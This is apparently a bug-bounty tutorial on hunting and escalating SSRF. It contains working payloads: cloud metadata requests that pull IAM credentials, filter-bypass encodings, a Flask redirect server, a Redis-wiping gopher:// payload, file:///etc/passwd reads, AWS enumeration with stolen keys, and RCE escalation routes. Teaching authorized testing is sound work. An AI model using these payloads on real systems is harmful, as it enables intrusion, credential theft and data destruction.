---
layout: "@layouts/MarkdownLayout.astro"
title: "SSRF Hunting in Bug Bounties: Techniques and Escalation"
description: "How to find and escalate server-side request forgery vulnerabilities in bounty targets, including blind SSRF detection and cloud metadata exploitation."
date: "2026-04-07"
---

Server-side request forgery is one of those vulnerability classes that can range from informational to critical depending entirely on what sits behind the firewall. A basic SSRF that confirms a port is open might earn you $500. The same SSRF chained with cloud metadata access to dump IAM credentials can pay $15,000 or more. I have seen both ends of that spectrum, and the difference is not luck. It is knowing where to push once you find the initial flaw.

SSRF was its own category (A10) in the OWASP Top 10 for 2021. In the [2025 revision](https://owasp.org/Top10/), it got merged into Broken Access Control. Some hunters read that as SSRF becoming less important. I read it the opposite way. SSRF is fundamentally an access control problem - the server is making requests on your behalf to resources you should not reach. The merge reflects that SSRF has become so intertwined with cloud infrastructure and internal service access that treating it separately no longer made sense. The bugs did not go away. They got absorbed into a bigger category because access boundaries are the core issue.

If you are already [hunting access control bugs](/learn/idor-and-broken-access-control-hunting), you should be looking for SSRF too. The mindset is the same: can I make the application act on a resource it should not let me reach?

## What SSRF actually is

SSRF happens when an application fetches a URL or network resource based on user input, and the server makes that request from its own network position. The server sits inside the network perimeter. It can reach internal services, cloud metadata endpoints, databases, admin panels, and other hosts that your browser cannot touch directly.

The simplest case: an application has a feature that fetches a URL. Maybe it is a webhook configuration, a URL preview, a PDF generator that renders HTML from a URL, or an image proxy. You supply `http://169.254.169.254/latest/meta-data/` instead of a legitimate URL. If the server fetches it and returns (or leaks) the response, you just accessed the AWS instance metadata service from outside the network.

```http
POST /api/webhooks HTTP/1.1
Host: app.target.com
Content-Type: application/json
Cookie: session=your_token

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

That is the classic case. But SSRF surfaces in far more places than obvious URL input fields.

## Where to find SSRF injection points

I look for SSRF in every feature that causes the server to make an outbound request. Some are obvious. Most are not.

**Obvious targets:**

- Webhook URLs (Slack, Discord, custom integrations)
- URL preview or link unfurling features
- File import from URL (spreadsheets, images, documents)
- PDF or screenshot generation from a URL
- RSS or Atom feed readers
- OAuth callback URLs and redirect URIs

**Less obvious targets:**

- SVG uploads that contain `<image href="http://internal-host/">` or `<use xlink:href="...">`
- XML uploads or API inputs vulnerable to XXE, where the external entity fetches an internal URL
- HTML-to-PDF converters processing `<iframe>`, `<link>`, `<img>`, or CSS `url()` references
- Image processing libraries that follow redirects from EXIF or metadata fields
- Email header injection that triggers the mail server to connect to an attacker-controlled host
- DNS rebinding through any feature that resolves a hostname you control
- GraphQL or REST API parameters that accept URLs for avatars, file storage locations, or export destinations

I prioritize [API endpoints](/learn/api-security-testing-for-bug-bounties) because they are more likely to accept raw URLs without the UI-level restrictions that a web form might impose.

## Classic SSRF vs. blind SSRF

With classic SSRF, the server fetches your URL and you can see the response body. You ask for `http://169.254.169.254/latest/meta-data/` and the application returns the metadata in the HTTP response, in an error message, in a rendered PDF, or in some other output you can read.

Blind SSRF is more common and harder to prove. The server makes the request, but you never see the response. Maybe the webhook fires but the application just stores a success/failure status. Maybe the PDF renderer fetches your URL but does not display the content.

### Detecting blind SSRF

You need an out-of-band callback server. I use Burp Collaborator, but free alternatives work too:

- [interact.sh](https://github.com/projectdiscovery/interactsh) from ProjectDiscovery
- [Webhook.site](https://webhook.site) for quick tests
- Your own VPS running a simple HTTP/DNS listener

The technique is straightforward. Supply your callback URL as the target:

```http
POST /api/integrations/test HTTP/1.1
Content-Type: application/json

{"webhook_url": "https://your-id.oastify.com"}
```

If your callback server receives a request from the target's server IP, you confirmed the server makes outbound requests to user-controlled URLs. That alone is a finding. The next step is proving you can hit internal resources.

### Proving blind SSRF reaches internal hosts

Time-based inference is your best tool here. Compare the server's response time when you point it at different targets:

```bash
# Point at a host that exists internally - fast response
curl -w "%{time_total}" -X POST https://app.target.com/api/webhooks \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:80/"}'

# Point at a closed port - connection refused, also fast
curl -w "%{time_total}" -X POST https://app.target.com/api/webhooks \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:9999/"}'

# Point at a filtered port - timeout, slow response
curl -w "%{time_total}" -X POST https://app.target.com/api/webhooks \
  -H "Content-Type: application/json" \
  -d '{"url": "http://10.0.0.1:8080/"}'
```

Different response times for different internal IPs and ports give you a map of the internal network. That is enough to prove impact even if you never see response bodies.

Error message differentiation helps too. Some applications return different error strings for "connection refused" vs. "connection timed out" vs. "host not found." Each tells you something about the internal network topology.

## Cloud metadata exploitation

This is where SSRF payouts jump from medium to critical. Every major cloud provider runs a metadata service on a link-local address that is reachable from any instance in the cloud environment.

### AWS (IMDSv1)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
http://169.254.169.254/latest/user-data/
```

If the instance uses IMDSv1 (no token required), a simple GET returns temporary AWS credentials - AccessKeyId, SecretAccessKey, and SessionToken. Those credentials let you call AWS APIs as the instance's IAM role. Depending on the role's permissions, you might read S3 buckets, access databases, invoke Lambda functions, or pivot further into the account.

AWS introduced [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) to mitigate this. IMDSv2 requires a PUT request to get a session token first:

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Most SSRF vectors only allow GET requests, so IMDSv2 blocks them. But not all. If your SSRF injection point lets you control the HTTP method and headers (some webhook testing features do), IMDSv2 does not help. And many organizations still have not migrated all their instances to IMDSv2-only mode.

### GCP

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
```

GCP requires a `Metadata-Flavor: Google` header. Same deal as IMDSv2 - if your SSRF lets you set headers, you can bypass this. Some SSRF vectors through server-side HTML renderers let you set arbitrary headers via `<meta>` tags or JavaScript `fetch()`.

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Azure requires a `Metadata: true` header. Same header injection considerations apply.

### Beyond metadata endpoints

Internal services are often just as valuable. Common targets on internal networks:

- Kubernetes API server at `https://kubernetes.default.svc` (port 443 or 6443)
- Docker API at `http://127.0.0.1:2375`
- Consul at `http://127.0.0.1:8500/v1/agent/members`
- Elasticsearch at `http://127.0.0.1:9200/_cat/indices`
- Redis at `http://127.0.0.1:6379` (use the gopher:// protocol to send commands)
- Internal admin panels on non-standard ports

## Bypassing SSRF filters

Most applications that accept URLs have some form of SSRF protection. The question is how well it was implemented. In my experience, most allowlists and denylists have gaps.

### DNS rebinding

The server resolves your hostname, checks it is not internal, then makes the request. But DNS resolution is not atomic with the request. If your DNS server returns a public IP on the first lookup (passing the check) and an internal IP on the second lookup (used for the actual connection), you bypass the filter.

Set up a DNS server that alternates between responses, or use a service like [rbndr.us](http://rbndr.us):

```
http://7f000001.c0a80001.rbndr.us/
```

This hostname alternates between resolving to 127.0.0.1 and 192.168.0.1.

### IP representation tricks

Denylists often check for `127.0.0.1` and `169.254.169.254` as strings. But there are many ways to represent the same IP:

```
# 127.0.0.1 alternatives
http://2130706433/          # Decimal
http://0x7f000001/          # Hex
http://0177.0.0.1/          # Octal
http://127.1/               # Shortened
http://127.0.0.1.nip.io/    # DNS that resolves to 127.0.0.1
http://[::1]/               # IPv6 loopback
http://0/                   # Some systems treat this as 0.0.0.0
http://127.000.000.001/     # Padded octal

# 169.254.169.254 alternatives
http://2852039166/           # Decimal
http://0xa9fea9fe/           # Hex
http://[::ffff:a9fe:a9fe]/   # IPv6-mapped IPv4
http://169.254.169.254.nip.io/
```

### Redirect-based bypass

The server validates your URL, confirms it points to a public host, then fetches it. But your server responds with a 302 redirect to an internal address:

```python
# Run this on your VPS
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redir():
    return redirect('http://169.254.169.254/latest/meta-data/')

app.run(host='0.0.0.0', port=8080)
```

Supply `http://your-vps:8080/redirect` as the URL. The initial check passes because your VPS has a public IP. But when the server follows the redirect, it ends up at the metadata endpoint. Many SSRF filters do not re-validate after following redirects.

### Protocol smuggling

If the application does not restrict the URL scheme, try:

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
file:///etc/passwd
dict://127.0.0.1:6379/info
```

The `gopher://` protocol is particularly dangerous because it lets you send raw TCP data to any port. You can use it to send commands to Redis, SMTP, or other text-based protocols. Gopherus is a tool that generates these payloads for common services.

### URL parser confusion

Different URL parsers in the same request pipeline can disagree on what a URL means:

```
http://evil.com#@169.254.169.254/
http://169.254.169.254\@evil.com/
http://evil.com@169.254.169.254/
```

The validation library might parse the hostname as `evil.com`, while the HTTP client that actually makes the request interprets it as `169.254.169.254`. This class of bug comes from discrepancies between URL parsers - one for validation, another for the actual request.

## Escalation paths

Finding SSRF is step one. Making it pay well requires escalation.

### SSRF to credential theft

Cloud metadata access is the most direct path. Once you have AWS credentials from the metadata service, enumerate what they can do:

```bash
# Using stolen credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws iam list-roles
```

Document what the credentials can access and include that in your report. A credential that can list S3 buckets containing customer data is much more impactful than one limited to CloudWatch metrics.

### SSRF to internal service access

Use the SSRF to probe internal services. If you find an internal admin panel, an unauthenticated Elasticsearch instance, or a Kubernetes API, screenshot or document what is accessible. Internal services often lack authentication because they were never meant to be reachable from outside.

### SSRF to remote code execution

The highest-severity escalation. Paths to RCE from SSRF:

- Access the Docker API (`http://127.0.0.1:2375`) and create a container with a host mount
- Hit an internal Jenkins, GitLab, or CI/CD system that allows job execution
- Use gopher:// to inject commands into Redis (`EVAL` with Lua, or writing to a crontab via `CONFIG SET dir`)
- Access Kubernetes API and create a pod with a host path volume

These are not hypothetical. Every one of these has been reported in real bounty programs and paid out at critical severity.

### Writing the report

When reporting SSRF, demonstrate the full chain. Do not just report "I can make the server fetch an arbitrary URL." Show what that access gets you. Structure your report around the [CVSS impact](/learn/understanding-cvss-scoring-for-bounty-hunters) - confidentiality, integrity, availability.

A strong SSRF report looks like:

1. Here is the injection point (exact HTTP request)
2. Here is proof the server makes the request (callback server logs or response data)
3. Here is what I can reach (metadata endpoint, internal service, specific internal hosts)
4. Here is the real-world impact (credentials obtained, data accessible, potential for lateral movement)

If you can only prove blind SSRF with no metadata access, it is still worth reporting. Frame it as: the server will make requests to arbitrary internal hosts, an attacker could use this for internal port scanning, and the finding indicates that SSRF protections are missing. Most programs pay medium severity for confirmed blind SSRF even without a dramatic escalation chain.

## Practical methodology

When I test a target for SSRF, I follow this sequence:

1. Map every feature that accepts URLs or makes outbound requests. Use your [recon data](/learn/bug-bounty-recon-methodology) and proxy history.
2. Test each injection point with your callback server first. Confirm the server makes outbound requests.
3. Try `http://127.0.0.1` and `http://169.254.169.254`. If they work, you are done with detection. Move to exploitation.
4. If direct internal IPs are blocked, work through the bypass list: DNS rebinding, IP encoding tricks, redirects, protocol schemes, URL parser confusion.
5. Once you have internal access, map what is reachable. Try common internal service ports (80, 443, 8080, 8443, 9200, 6379, 5432, 3306, 27017, 2375, 6443, 8500).
6. Attempt credential theft via cloud metadata. Try all three major providers unless you know which cloud the target uses.
7. Document everything with timestamps, exact requests, and exact responses.

## Resources

[PortSwigger's SSRF labs](https://portswigger.net/web-security/ssrf) are the best free practice environment. They cover basic SSRF, blind detection, and filter bypass techniques.

The [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) explains the defensive side, which helps you predict which mitigations a target has in place and where they fall short.

The [OWASP Top 10](https://owasp.org/Top10/) explains the broader Broken Access Control category that now includes SSRF, and our [breakdown for bounty hunters](/learn/owasp-top-10-2025-for-bug-bounty-hunters) maps each category to actionable testing approaches.

AWS's [IMDS documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html) details IMDSv1 vs. v2 differences. Understanding the defense helps you identify targets that have not fully migrated.

SSRF is not going anywhere. Cloud infrastructure made it more impactful, not less. Every application feature that fetches a URL is a potential entry point into the internal network. The merge into Broken Access Control in OWASP's taxonomy just reflects that reality - these are access boundary violations, and the cloud made the boundaries matter more. Learn the bypass techniques, understand the internal services you might reach, and always push for the full escalation chain. That is the difference between a medium-severity finding and a five-figure payout.
